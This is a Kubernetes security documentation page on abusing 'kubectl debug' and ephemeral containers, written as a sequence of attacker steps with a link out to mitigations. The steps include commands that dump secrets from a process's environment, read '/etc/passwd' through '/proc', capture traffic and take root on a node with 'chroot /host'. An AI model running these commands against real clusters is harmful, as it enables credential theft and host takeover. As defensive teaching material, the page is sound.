---
sidebar_position: 23
title: "Ephemeral Debug Container Abuse"
description: "How attackers abuse kubectl debug and ephemeral containers to inject debugging tools, access process namespaces, and compromise Kubernetes workloads."
keywords: [kubernetes security, ephemeral containers, kubectl debug, debug container attack, kubernetes debugging, process namespace sharing, container injection, kubernetes forensics, CKS]
tags: [attack-vector, pod-security, debugging, CKS]
related:
  - /docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/debug_container_security/
  - /docs/attack_vectors/privileged_container_escape/
  - /docs/best_practices/cluster_setup_and_hardening/pod_security/pod_security_standards/
---

# Ephemeral Debug Container Abuse

**Ephemeral containers** are a Kubernetes feature that allows injecting temporary debugging containers into running pods without modifying the pod specification. While designed for troubleshooting, this capability can be abused by attackers with `pods/ephemeralcontainers` permissions to **inject malicious containers, access shared process namespaces, and extract sensitive data** from production workloads.

The `kubectl debug` command simplifies this process, making it easy for an attacker with sufficient RBAC permissions to compromise running applications.

---

## Exploitation Steps

An attacker with permissions to create ephemeral containers exploits the debugging feature to access sensitive workloads.

### 1. Identify Target Pods

The attacker lists pods to identify high-value targets:

```bash
kubectl get pods -A -o wide
```

They look for pods running sensitive workloads such as databases, API servers, or services handling credentials.

---

### 2. Inject a Debug Container

Using `kubectl debug`, the attacker injects an ephemeral container into the target pod:

```bash
kubectl debug -it api-server-pod -n production \
  --image=busybox \
  --target=api-container
```

The `--target` flag shares the process namespace with the specified container, giving the debug container access to the target's processes.

---

### 3. Access Target Container's Process Namespace

With process namespace sharing enabled, the attacker can inspect the target container's processes:

```bash
ps aux
```

They can also access the target's filesystem via `/proc`:

```bash
ls -la /proc/1/root/
cat /proc/1/root/etc/passwd
```

---

### 4. Extract Environment Variables and Secrets

The attacker reads environment variables from the target process, which often contain credentials:

```bash
cat /proc/1/environ | tr '\0' '\n'
```

This may reveal:

- Database connection strings
- API keys
- Authentication tokens
- Cloud credentials

---

### 5. Capture Network Traffic

If the debug container has network tools, the attacker can capture traffic:

```bash
kubectl debug -it api-server-pod -n production \
  --image=nicolaka/netshoot \
  --target=api-container

# Inside the debug container
tcpdump -i any -w /tmp/capture.pcap
```

---

### 6. Debug Node Directly

The attacker can also debug nodes directly, gaining host-level access:

```bash
kubectl debug node/worker-1 -it --image=busybox

# Inside the debug container
chroot /host /bin/bash
```

This provides root access to the underlying node filesystem.

---

### Result

The attacker achieves:

- **Process inspection** of target containers
- **Environment variable extraction** containing secrets
- **Filesystem access** to the target container's root
- **Network traffic capture** for credential harvesting
- **Node-level access** when debugging nodes directly

---

## Mitigation

➡ [Securing Debug Container Access](/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/debug_container_security/)

---

## References

This article is based on information from the following official sources:

1. [Ephemeral Containers](https://kubernetes.io/docs/concepts/workloads/pods/ephemeral-containers/) - Kubernetes Documentation
2. [Debugging Running Pods](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/) - Kubernetes Documentation
3. [Share Process Namespace](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/) - Kubernetes Documentation
